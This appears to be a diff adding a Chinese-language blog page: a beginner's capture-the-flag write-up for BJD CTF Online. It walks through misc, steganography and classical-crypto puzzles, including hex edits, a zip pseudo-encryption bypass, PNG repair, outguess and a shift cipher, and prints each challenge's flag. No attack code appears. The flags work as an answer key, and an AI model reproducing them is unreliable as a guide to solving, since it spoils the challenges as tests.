@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang=zh-TW>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="為時一天多的新手賽一下子就結束了。感覺有很多東西值得寫一寫。這次比賽對於我來說是一個學習的過程，也是一個把各種想法實踐的過程。其中有歡樂，也有遺憾。 Summary這次比賽還是菜得真實，雖然按照計劃交叉解題，但是停頓的卻總是同一邊。導致最後 Crypto 和 Misc 做了不少，但本應該寫上一些的 Web 卻沒能寫出來。這也是我覺得這次比賽很遺憾的原因之一。Crypto 和 Misc 這次倒是寫了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某萌新的 BJD CTF Online 之旅">
+<meta property="og:url" content="https://lemonprefect.cn/zh-TW/posts/95dd4451.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="為時一天多的新手賽一下子就結束了。感覺有很多東西值得寫一寫。這次比賽對於我來說是一個學習的過程，也是一個把各種想法實踐的過程。其中有歡樂，也有遺憾。 Summary這次比賽還是菜得真實，雖然按照計劃交叉解題，但是停頓的卻總是同一邊。導致最後 Crypto 和 Misc 做了不少，但本應該寫上一些的 Web 卻沒能寫出來。這也是我覺得這次比賽很遺憾的原因之一。Crypto 和 Misc 這次倒是寫了">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/dbefc985-0bb5-40b5-9154-aad1b7b76aeb/1613214347879978.9361855c1fdcb2776f7b9d2f64695fa8b1db09be.jpg">
+<meta property="article:published_time" content="2020-03-23T03:51:56.000Z">
+<meta property="article:modified_time" content="2021-04-28T08:29:41.107Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://butter.lumosary.workers.dev/images/archive/dbefc985-0bb5-40b5-9154-aad1b7b76aeb/1613214347879978.9361855c1fdcb2776f7b9d2f64695fa8b1db09be.jpg">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=48">
+          
+        
+      
+      
+        
+          
+            <link rel="icon" type="image/png" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=192">
+          
+        
+      
+      
+        
+          
+            <link rel="apple-touch-icon" size="180x180" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=180">
+          
+        
+      
+    
+    <!-- title -->
+    <title>某萌新的 BJD CTF Online 之旅</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        <li><a class="icon" aria-label="上一篇 " href="/zh-CN/posts/95dd4451.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-CN/posts/c2e31117.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="/zh-CN/posts/95dd4451.html">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="#">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="回到頁首 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到頁首</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/95dd4451.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/95dd4451.html&text=某萌新的 BJD CTF Online 之旅"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/95dd4451.html&title=某萌新的 BJD CTF Online 之旅"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/95dd4451.html&is_video=false&description=某萌新的 BJD CTF Online 之旅"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=某萌新的 BJD CTF Online 之旅&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/95dd4451.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/95dd4451.html&title=某萌新的 BJD CTF Online 之旅"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/95dd4451.html&title=某萌新的 BJD CTF Online 之旅"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/95dd4451.html&title=某萌新的 BJD CTF Online 之旅"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/95dd4451.html&title=某萌新的 BJD CTF Online 之旅"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/95dd4451.html&name=某萌新的 BJD CTF Online 之旅&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/95dd4451.html&t=某萌新的 BJD CTF Online 之旅"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reflection"><span class="toc-number">2.</span> <span class="toc-text">Reflection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">3.</span> <span class="toc-text">Write Up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%91%E9%A3%9F%E7%9A%84%E5%B0%8F%E8%9B%87"><span class="toc-number">3.1.</span> <span class="toc-text">挑食的小蛇</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%A7%90%E5%A7%90"><span class="toc-number">3.2.</span> <span class="toc-text">小姐姐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A-Beautiful-Picture"><span class="toc-number">3.3.</span> <span class="toc-text">A Beautiful Picture</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%B0%A1%E5%96%AE%E7%9A%84MISC"><span class="toc-number">3.4.</span> <span class="toc-text">最簡單的MISC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Imagin-%E9%96%8B%E5%A0%B4%E6%9B%B2"><span class="toc-number">3.5.</span> <span class="toc-text">Imagin - 開場曲</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Real-EasyBaBa"><span class="toc-number">3.6.</span> <span class="toc-text">Real EasyBaBa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%96%E7%81%AB%E6%98%AD%E6%98%AD"><span class="toc-number">3.7.</span> <span class="toc-text">聖火昭昭</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-Baba"><span class="toc-number">3.8.</span> <span class="toc-text">Easy Baba</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B0%BD%E5%88%B0"><span class="toc-number">3.9.</span> <span class="toc-text">簽到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%87%95%E8%A8%80%E7%87%95%E8%AA%9E"><span class="toc-number">3.10.</span> <span class="toc-text">燕言燕語</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%81%E6%96%87%E7%9B%B2%E4%BA%86"><span class="toc-number">3.11.</span> <span class="toc-text">老文盲了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cat-flag"><span class="toc-number">3.12.</span> <span class="toc-text">cat flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%88%E8%83%BD%E7%B2%BE%E9%80%9A"><span class="toc-number">3.13.</span> <span class="toc-text">靈能精通</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Y1nglish"><span class="toc-number">3.14.</span> <span class="toc-text">Y1nglish</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Schro%CC%88dinger"><span class="toc-number">3.15.</span> <span class="toc-text">Schrödinger</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#duangShell"><span class="toc-number">3.16.</span> <span class="toc-text">duangShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%87%E8%B1%AC%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80"><span class="toc-number">3.17.</span> <span class="toc-text">假豬套天下第一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fake-google"><span class="toc-number">3.18.</span> <span class="toc-text">fake google</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B0%A1%E5%96%AE%E6%B3%A8%E5%85%A5"><span class="toc-number">3.19.</span> <span class="toc-text">簡單注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#old-hack"><span class="toc-number">3.20.</span> <span class="toc-text">old-hack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-MD5"><span class="toc-number">3.21.</span> <span class="toc-text">Easy MD5</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        某萌新的 BJD CTF Online 之旅
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-23T03:51:56.000Z" itemprop="datePublished">2020-03-23</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>為時一天多的新手賽一下子就結束了。感覺有很多東西值得寫一寫。這次比賽對於我來說是一個學習的過程，也是一個把各種想法實踐的過程。其中有歡樂，也有遺憾。</p>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>這次比賽還是菜得真實，雖然按照計劃交叉解題，但是停頓的卻總是同一邊。導致最後 Crypto 和 Misc 做了不少，但本應該寫上一些的 Web 卻沒能寫出來。這也是我覺得這次比賽很遺憾的原因之一。Crypto 和 Misc 這次倒是寫了不少，但是依舊沒有能夠打穿（就差那麼一點點，如果 tar.gz 我能找到思路的話也許就真的可以打通這次的 Misc 了。）不管怎麼說，我覺得這次的比賽對我來說更像是一個快速學習的過程，限制時間的解題使得我快速攝取了很多東西，就這點上來說，名次反而是次要了。</p>
+<h2 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h2><p>其實比賽結束之後心裡還是挺難過的，畢竟感覺留下遺憾了。而且比賽的時候總是會越來越急躁，不停地看 Matrix，然後不停地去嘗試，翻資料，換方法。特別是第一天比賽剛開始的時候，感覺特別難冷靜地看題，簽完到就點開了薛定諤。結果沒冷靜看的我完全沒思路，一通亂懟，自然沒結果。雖然時長和大家打趣說要善用搜索引擎，<span class="HighlightWKT7BlueGreen">可是到了關鍵時候，自己卻查不到某些東西，甚至連關鍵詞的提取都能出錯</span>。再者，感覺題還是做少了，大部分時間都在做著一些型別差不多的題，但實際上還有很多很多沒有見過的東西，這也導致在拿到一些題目的時候，幾乎把標籤頁開炸了，每一個點都在用搜索引擎仔細檢索。果然還是<span class="HighlightWKT7BlueGreen">各種題目見得太少了</span>，加上一部分的偏執，以及缺少嘗試，常常是自己想著想著就把思路掐掉換另外一個了。而且做題的時候容易想當然，就有種“欸這個點我好像看過，應該是這樣寫的”的感覺，然後就會“沒道理啊，怎麼會呢？怎麼會不對呢？”的感覺。所以，還是<span class="HighlightWKT7BlueGreen">要仔仔細細多嘗試，不要過於想當然，有的時候並不是想啥是啥</span>。（何況我也沒那水平QAQ）還是得<span class="HighlightWKT7BlueGreen">慢慢地好好學，多看多寫，這樣才能有所改善</span>。</p>
+<p>Ps. 事實證明，真的不要糾結一題，我卡在薛定諤卡了好久，然後今天發現了後面的一道簡單題。（其實薛定諤也簡單，我當時時間戳都解出來了，但是走錯了思路，沒去注意那個 check）QAQ</p>
+<p>回過來想想，其實解題就像是生活，所有事情都不可能很急躁地辦成，越到關鍵時刻越要冷靜。就像某道睡醒了之後突然解出來的 Crypto 以及聽了很久的開場曲。好好聽，把每一個音對準了，才能拿到 flag；好好學，把每一個點摸透了，才能真正地勝利。</p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="挑食的小蛇"><a href="#挑食的小蛇" class="headerlink" title="挑食的小蛇"></a>挑食的小蛇</h3><p>拿到題目首先審計了一波原始碼，因為 vi 沒有高亮很難受，就 scp 傳了一份到我伺服器上然後下載下來審計，發現瞭如下程式碼。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 獎勵shell</span></span><br><span class="line">        <span class="keyword">if</span>( score &gt;= <span class="number">30</span> &amp;&amp; cnt &gt; <span class="number">2333</span>)&#123;</span><br><span class="line">            GameState=<span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033c&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;stty icanon&quot;</span>);          <span class="comment">// 恢復緩衝</span></span><br><span class="line">            system(<span class="string">&quot;stty echo&quot;</span>);            <span class="comment">// 恢復回顯</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[?25h&quot;</span>);            <span class="comment">// 恢復滑鼠顯示</span></span><br><span class="line">            GiveAwards();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>於是開始正經玩起了貪吃蛇（本來想改原始碼重新編譯的，但遠端沒給 gcc 做不到），好在要求並不難，到達 3000 分也就是讓蛇吃到 30 個塊塊之後原地轉圈刷步數到 2333 然後遊戲結束。然後 <code>cat flag</code> 就能拿到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">寫出來之後交了就忘了記flag</span><br></pre></td></tr></table></figure>
+
+<h3 id="小姐姐"><a href="#小姐姐" class="headerlink" title="小姐姐"></a>小姐姐</h3><p>解壓 <code>xiaojiejie.zip</code> 拿到圖片之後用 binwalk 跑了一遍，發現就是一張普通圖片，但是顯示好像不太正常，有一部分斷層了。於是放進 010editor 裡面隨手搜了一波 <code>BJD</code> 就找到了 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;haokanma_xjj&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A Beautiful Picture"></a>A Beautiful Picture</h3><p>拿到圖之後發現是為數不多的 png，馬上就想到了之前寫過的修改圖片高度的題型，但還是用了一手 stegsolve，當然並沒有什麼收穫。注意到圖片的寬度和高度呈現一種很奇怪的關係（1000x900 感覺真的很刻意）於是嘗試把圖片放到 010editor 裡，把代表高度的 <code>03 84</code> 改成 <code>03 E8</code> 也就是 1000。儲存後重新開啟圖片得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;PnG_He1ghT_1s_WR0ng&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="最簡單的MISC"><a href="#最簡單的MISC" class="headerlink" title="最簡單的MISC"></a>最簡單的MISC</h3><p>拿到壓縮包之後發現是加密的，於是放到 010editor 裡按照偽加密的套路開始嘗試，搜尋常見的全域性方式位標記的加密標記 <code>14 00 09 00 </code>，一共找到兩處，將它們改為 <code>14 00 00 00</code> 之後就過了偽加密，正常解壓得到 secret。</p>
+<p>將 secret 放入 010editor 裡，由頭部的 <code>IHDR</code> 和 尾部的 <code>IEND</code> 知道這是一張 png 圖片。於是找一張正常的 png，複製 secret 丟失的部分，即 <code>89 50 4E 47 0D 0A 1A 0A 00 00 00 00 0D</code> 這一部分，將其相應得補充到 secret 的頭部，儲存後即可正常開啟 secret 圖片。得到一串 hex <code>42 4A 44 7B 79 31 6E 67 7A 75 69 73 68 75 61 69 7D</code> 將其進行編碼轉換後可得flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;y1ngzuishuai&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Imagin-開場曲"><a href="#Imagin-開場曲" class="headerlink" title="Imagin - 開場曲"></a>Imagin - 開場曲</h3><p>這題首先從開始的畫面中得知 Mikutap，接下來就是按鍵聽音的過程，將所聽到的音和按鍵一一對應。結合給出的 hint 得知數字的範圍，然後慢慢聽出 flag。（真好玩）</p>
+<p>附上我聽出來的按鍵順序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD BJD MIKU TAP MIKU TAP 331 331 3 331 331 3</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;MIKUTAP3313313&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real EasyBaBa"></a>Real EasyBaBa</h3><p>拿到顯示不正常的圖片之後，跑了一下 binwalk，發現依舊是普通圖片。於是開啟 010editor，有了前面小姐姐那題的經驗，就想到 flag 應該是藏在檔案本身的內容裡。果然在開啟之後發現有一個區段很奇怪，完全由 <code>FF 00</code> 這兩個 hex 交替組成。一開始沒看出什麼，直到我嘗試去讀它們的輪廓，就發現了一些東西。（下面是那個區段 很想找個高亮來著 但是這樣也差不多能看出來）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FF FF FF 00 FF FF FF FF 00 FF FF 00 00 00 FF FF</span><br><span class="line">FF 00 FF 00 00 00 FF 00 00 FF 00 FF 00 00 FF 00</span><br><span class="line">FF 00 FF 00 00 00 FF 00 00 FF 00 FF 00 00 FF 00</span><br><span class="line">FF FF 00 00 00 00 FF 00 00 FF 00 FF 00 FF 00 00</span><br><span class="line">FF 00 FF 00 00 00 FF 00 00 FF 00 FF 00 00 FF 00</span><br><span class="line">FF 00 FF 00 FF 00 FF 00 00 FF 00 FF 00 00 FF 00</span><br><span class="line">FF FF FF 00 FF FF FF 00 00 FF FF 00 00 00 FF FF</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF FF FF 00 FF FF FF 00 FF FF FF 00 FF FF 00 00</span><br><span class="line">FF 00 00 00 00 00 FF 00 00 00 FF 00 00 FF 00 00</span><br><span class="line">FF FF FF 00 00 00 FF 00 FF FF FF 00 00 FF 00 00</span><br><span class="line">00 00 FF 00 00 00 FF 00 FF 00 00 00 00 FF 00 00</span><br><span class="line">FF FF FF 00 00 00 FF 00 FF FF FF 00 FF FF FF 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF FF FF 00 FF 00 FF 00 FF FF FF 00 FF FF FF 00</span><br><span class="line">FF 00 00 00 FF 00 FF 00 FF 00 FF 00 00 00 FF 00</span><br><span class="line">FF FF FF 00 FF FF FF 00 FF FF FF 00 00 00 FF 00</span><br><span class="line">00 00 FF 00 00 00 FF 00 00 00 FF 00 00 00 FF 00</span><br><span class="line">FF FF FF 00 00 00 FF 00 FF FF FF 00 00 00 FF 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF FF FF 00 FF FF 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF 00 00 00 00 FF 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF FF FF 00 00 FF 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF 00 FF 00 00 FF FF 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF 00 FF 00 00 FF 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF FF FF 00 00 FF 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 FF FF 00 63 DA E9 3C 36 B1 AA 93 59</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;572154976&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="聖火昭昭"><a href="#聖火昭昭" class="headerlink" title="聖火昭昭"></a>聖火昭昭</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">outguess</span></p>
+<p>解壓 zip 之後得到一張貓貓的圖，檢視圖片屬性，有一段密文。使用 <a target="_blank" rel="noopener" href="http://hi.pcmoe.net/buddha.html">新約佛論禪</a> 這個站點的解密工具解密之後可以得到 key <code>gemlovecom</code>，根據 hint 修訂為 <code>gemlove</code>。</p>
+<p>再根據題目提示的 guess，一番搜尋之後找到了 GitHub 上的 outguess 工具。Clone、編譯並安裝之後根據用法寫出下列指令從圖片中分離到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k &quot;gemlove&quot; -r sheng_huo_zhao_zhao.jpg hidden</span><br></pre></td></tr></table></figure>
+
+<p>從 hidden 中得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;wdnmd_misc_1s_so_Fuck1ng_e@sy&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Easy-Baba"><a href="#Easy-Baba" class="headerlink" title="Easy Baba"></a>Easy Baba</h3><p>下載到圖片之後發現有 19M，果斷跑了一波 binwalk，發現結果很奇怪，中間好像插入了什麼。於是跑了一波 foremost，得到了一張圖片和一個壓縮包。壓縮包解壓後有一張 jpg 叫 <strong>裡面都是出題人</strong>。但是這張圖片無法開啟，於是放進 010editor 中，由檔案頭部的 <code>52 49 46 46 1C 7D 7D 02 41 56 49 20</code> 這一段可知這是一個 avi 格式的影片檔案，於是修正拓展名。根據題目 hint，將影片放進 Pr 中逐幀播放，在各出題人的圖片上得到了三個二維碼（其實應該還有一個？但是我得到這三個之後猜出來了）。將三個二維碼截圖之後放進 Ps 中，調整一下色階然後反相，就能得到能夠輕易掃出來的二維碼。逐個掃描之後得到三段 hex。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">6167696E5F6C</span><br><span class="line">6F76655F59</span><br><span class="line">316E677D</span><br></pre></td></tr></table></figure>
+
+<p>轉換編碼之後得到了一部分 flag  <code>agin_love_Y1ng&#125;</code>  根據題目的提示得知題目中的主角應該是 imagin 師傅，於是補全 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;imagin_love_Y1ng&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="簽到"><a href="#簽到" class="headerlink" title="簽到"></a>簽到</h3><p>簡單的 Base64 編碼轉換，將題目所給字串解碼可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;W3lc0me_T0_BJDCTF&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="燕言燕語"><a href="#燕言燕語" class="headerlink" title="燕言燕語"></a>燕言燕語</h3><p>拿到題目的字串之後觀察可知這是一段 hex，編碼轉換之後得到明文 <code>yanzi ZJQ&#123;xilzv_iqssuhoc_suzjg&#125; </code>。<code>ZJQ BJD</code> 這二者的對應關係應該算是提示，於是手算了一下，很容易發現，Z 往前移動 24 個位置得到 B，而 J 的位置沒移動，Q 向前移動 13 個位置得到 D。而 24、0、13 的位置編號剛好對應當 A 為 0 時的字母編號。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">y:24</span><br><span class="line">a:0</span><br><span class="line">n:13</span><br><span class="line">z:25</span><br><span class="line">i:8</span><br></pre></td></tr></table></figure>
+
+<p>根據上述的位置關係，迴圈使用 <code>yanzi</code> 作為解密的要素，將各個字元依次前移可以得到 flag。值得注意的是移動的時候要迴圈，即 Z 的後面又是 A。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;yanzi_jiushige_shabi&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h3><p>這題的附件是 rar，補全拓展名之後解壓得到 old_illiterate.txt。開啟之後得到難懂的中文，於是根據題目的 hint 去查了對應的拼音，得到 <code>bì jí dì dà kuò hào zhè jiù shì fǔ lài gē zhí jiē jiāo lè bā dà kuò hào </code>。根據這個提示把這段中文掐頭去尾然後包上 flag 的固定格式得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;淛匶襫黼瀬鎶軄鶛驕鰳哵&#125;</span><br></pre></td></tr></table></figure>
+
